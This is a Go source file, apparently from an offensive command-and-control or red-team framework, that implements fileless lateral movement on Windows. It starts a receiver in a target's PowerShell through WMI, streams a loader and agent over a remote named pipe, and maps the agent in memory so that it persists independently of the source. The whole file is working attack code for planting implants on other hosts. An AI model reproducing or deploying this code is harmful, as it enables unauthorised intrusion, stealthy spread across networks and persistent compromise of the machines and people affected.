package main

import (
	"fmt"
	"io"
	"syscall"
	"time"
	"unsafe"
)

// Named pipe dialing and I/O go through explicit synchronous kernel32 calls.
// os.OpenFile opens Windows handles with FILE_FLAG_OVERLAPPED but performs
// non-pollable file I/O with a null OVERLAPPED, which named pipes reject
// with ERROR_INVALID_PARAMETER (87) on runtimes predating the 2025 poller
// fix; os.NewFile carries the same version-dependent quirk surface. The
// loader channel instead owns one deterministic synchronous handle whose
// blocking ReadFile/WriteFile calls pass a null OVERLAPPED — the only valid
// combination for a non-overlapped handle. The deadline wrappers in
// wmi_loader.go already bound every blocking call with goroutine timeouts.
var (
	wmiLoaderKernel32     = syscall.NewLazyDLL("kernel32.dll")
	procLoaderCreateFileW = wmiLoaderKernel32.NewProc("CreateFileW")
	procLoaderWriteFile   = wmiLoaderKernel32.NewProc("WriteFile")
	procLoaderReadFile    = wmiLoaderKernel32.NewProc("ReadFile")
	procLoaderCloseHandle = wmiLoaderKernel32.NewProc("CloseHandle")
)

// CreateFileW parameter values for a synchronous, exclusive pipe client.
const (
	wmiLoaderGenericRead         uintptr       = 0x80000000
	wmiLoaderGenericWrite        uintptr       = 0x40000000
	wmiLoaderOpenExisting        uintptr       = 3
	wmiLoaderFileAttributeNormal uintptr       = 0x80 // no FILE_FLAG_OVERLAPPED
	wmiLoaderErrorNotFound       syscall.Errno = 2    // ERROR_FILE_NOT_FOUND
	wmiLoaderErrorPipeBusy       syscall.Errno = 231  // ERROR_PIPE_BUSY
	wmiLoaderErrorBrokenPipe     syscall.Errno = 109  // ERROR_BROKEN_PIPE
	wmiLoaderErrorNoData         syscall.Errno = 232  // ERROR_NO_DATA
)

// wmiPipeConn is the synchronous native pipe client. Closing the handle
// does not interrupt a blocked ReadFile or WriteFile, so a timed-out
// deadline wrapper leaves its goroutine blocked until the receiver exits
// (its own connection budget bounds that) and the kernel breaks the pipe.
type wmiPipeConn struct {
	handle uintptr
	path   string
}

// Write streams one buffer end to end. A byte-mode pipe write can return a
// short count, so the loop continues until the buffer is complete.
func (c *wmiPipeConn) Write(p []byte) (int, error) {
	total := 0
	for total < len(p) {
		chunk := p[total:]
		var written uint32
		// Convert inside Call so Go retains the buffer for the native call.
		ok, _, callErr := procLoaderWriteFile.Call(
			c.handle,
			uintptr(unsafe.Pointer(&chunk[0])),
			uintptr(len(chunk)),
			uintptr(unsafe.Pointer(&written)),
			0, // null OVERLAPPED: the handle is synchronous
		)
		if ok == 0 {
			return total, fmt.Errorf("native pipe write %s: %w", c.path, callErr)
		}
		if written == 0 {
			return total, io.ErrShortWrite
		}
		total += int(written)
	}
	return total, nil
}

// Read fills the buffer or returns the pipe's end. Broken-pipe and no-data
// both mean the receiver closed its end, which maps to io.EOF.
func (c *wmiPipeConn) Read(p []byte) (int, error) {
	if len(p) == 0 {
		return 0, nil
	}
	var read uint32
	// Convert inside Call so Go retains the buffer for the native call.
	ok, _, callErr := procLoaderReadFile.Call(
		c.handle,
		uintptr(unsafe.Pointer(&p[0])),
		uintptr(len(p)),
		uintptr(unsafe.Pointer(&read)),
		0, // null OVERLAPPED: the handle is synchronous
	)
	if ok == 0 {
		if errno, valid := callErr.(syscall.Errno); valid &&
			(errno == wmiLoaderErrorBrokenPipe || errno == wmiLoaderErrorNoData) {
			return 0, io.EOF
		}
		return 0, fmt.Errorf("native pipe read %s: %w", c.path, callErr)
	}
	if read == 0 {
		return 0, io.EOF
	}
	return int(read), nil
}

// Close releases the native handle; gc has no part in it.
func (c *wmiPipeConn) Close() error {
	if c.handle == 0 || c.handle == uintptr(syscall.InvalidHandle) {
		return nil
	}
	ok, _, callErr := procLoaderCloseHandle.Call(c.handle)
	if ok == 0 {
		c.handle = 0
		return fmt.Errorf("close native pipe handle %s: %w", c.path, callErr)
	}
	c.handle = 0
	return nil
}

// wmiLoaderMove deploys the server-staged artifact to the target through
// WMI and a named pipe, with no file staged on the target: the remote
// command starts the receiver inside the target's powershell.exe, the
// source streams the framed loader and agent halves over a kernel pipe, and
// the receiver maps the agent in memory. Unlike the WinRM deployment, the
// created process is independent of this source: the deployed session
// survives this agent and ends at target shutdown or an explicit kill.
func wmiLoaderMove(payload lateralPayload, targetSession string, agent []byte, deadline time.Time) error {
	transfer, err := prepareWinRMTransferFromBytes(agent)
	if err != nil {
		return fmt.Errorf("prepare loader transfer: %w", err)
	}
	transfer.deadline = deadline
	pipeName := wmiLoaderPipeName(targetSession)
	script := wmiLoaderScript(pipeName, targetSession, payload.WorkspaceID, transfer)
	command := buildWindowsCmdLine(append([]string{winrmReceiverCommandPath}, wmiLoaderArguments(script)...))
	if err := wmiCreateProcess(payload.Host, command); err != nil {
		return fmt.Errorf("start loader receiver on %s: %w", payload.Host, err)
	}
	conn, err := dialWmiLoaderPipe(payload.Host, pipeName, deadline)
	if err != nil {
		return err
	}
	defer conn.Close()
	if err := wmiCopyWithDeadline(conn, transfer.source, deadline); err != nil {
		return err
	}
	if err := wmiReadLoaderReply(conn, deadline); err != nil {
		return err
	}
	return nil
}

// dialWmiLoaderPipe connects the remote pipe the receiver created with an
// explicit synchronous CreateFileW. WMI returns as soon as the process is
// created, so the listening pipe may not exist yet: file-not-found and
// pipe-busy are retried until the deadline, and any other error is reported
// with the stage that failed.
func dialWmiLoaderPipe(host, pipeName string, deadline time.Time) (io.ReadWriteCloser, error) {
	path := `\\` + host + `\pipe\` + pipeName
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return nil, fmt.Errorf("encode loader channel path: %w", err)
	}
	for {
		// Convert inside Call so Go retains the path for the native call.
		handle, _, callErr := procLoaderCreateFileW.Call(
			uintptr(unsafe.Pointer(pathPtr)),
			wmiLoaderGenericRead|wmiLoaderGenericWrite,
			0, // exclusive pipe instance: no sharing
			0, // no security attributes
			wmiLoaderOpenExisting,
			wmiLoaderFileAttributeNormal,
			0,
		)
		if handle != uintptr(syscall.InvalidHandle) {
			return &wmiPipeConn{handle: handle, path: path}, nil
		}
		if errno, ok := callErr.(syscall.Errno); ok &&
			(errno == wmiLoaderErrorNotFound || errno == wmiLoaderErrorPipeBusy) {
			remaining := time.Until(deadline)
			if remaining <= 0 {
				return nil, fmt.Errorf("the loader channel on %s did not open before the deadline", host)
			}
			time.Sleep(min(250*time.Millisecond, remaining))
			continue
		}
		return nil, fmt.Errorf("open loader channel on %s: %w", host, callErr)
	}
}
